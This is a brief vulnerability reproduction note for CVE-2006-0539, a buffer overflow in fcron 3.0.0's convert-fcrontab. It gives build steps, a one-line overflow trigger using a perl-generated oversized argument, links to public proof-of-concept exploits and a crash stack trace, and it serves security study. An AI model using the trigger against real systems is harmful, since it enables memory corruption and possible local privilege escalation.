# CVE-2006-0539

## Experiment Environment

Ubuntu 8.10

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/CVE-2006-0539/fcron-3.0.0.src.tar.gz
tar -xvf fcron-3.0.0.src.tar.gz
cd fcron-3.0.0
./configure
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
./convert-fcrontab `perl -e 'print "pi3"x600'`
```

## PoCs

[Fcron Convert-FCronTab Local Buffer Overflow Vulnerability](https://www.securityfocus.com/bid/16467/exploit)

[Fcron 3.0 - Convert-FCronTab Local Buffer Overflow](https://www.exploit-db.com/exploits/27159/)

## Vulnerability Patch

### Root Cause

See [Fcron (convert-fcrontab) allow users to corruption on heap section.](https://www.securityfocus.com/archive/1/archive/1/423697/100/0/threaded) for details.

### Stack Trace

```
......
#9 0x40111caf in syslog () from /lib/libc.so.6
#10 0x0804a5d8 in log_syslog_str (priority=3, msg=0x804ee08 "Could not read ", 'A' <repeats 146 times>, " (truncated)")
at log.c:102
#11 0x0804a739 in log_e (priority=3, fmt=0x804abcf "Could not read %s", args=0xbffff014 "ĐČ\004\bpz\006@0l\001@áŘ")
at log.c:165
#12 0x0804a90c in die_e (fmt=0x804abcf "Could not read %s") at log.c:339
#13 0x0804923a in convert_file (file_name=0x804c8d0 'A' <repeats 200 times>...) at convert-fcrontab.c:153
#14 0x0804936d in main (argc=134523688, argv=0xbffff677) at convert-fcrontab.c:276
```

### Patch

## References
